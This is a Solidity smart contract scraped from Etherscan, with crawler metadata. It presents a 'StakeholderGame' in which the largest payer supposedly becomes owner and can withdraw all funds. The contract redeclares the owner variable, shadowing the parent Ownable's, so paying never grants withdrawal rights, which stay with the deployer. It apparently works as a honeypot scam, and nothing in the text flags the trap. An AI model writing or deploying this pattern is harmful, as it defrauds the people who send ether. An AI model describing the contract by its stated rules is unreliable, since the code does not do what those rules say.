//token_name	
//token_url	https://etherscan.io//address/0x0BcCcBa050c2cE6439c57bd203378B113cc3cFD6#code
//spider_time	2018/07/08 11:43:56
//token_Transactions	7 txns
//token_price	

pragma solidity ^0.4.19;

contract Ownable {
    address public owner;
    
    function Ownable() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract StakeholderGame is Ownable {
    address public owner;

    uint public largestStake;

    function purchaseStake() public payable {
        // if you own a largest stake in a company, you own a company
        if (msg.value > largestStake) {
            owner = msg.sender;
            largestStake = msg.value;
        }
    }

    function withdraw() public onlyOwner {
        // only owner can withdraw funds
        msg.sender.transfer(this.balance);
    }
}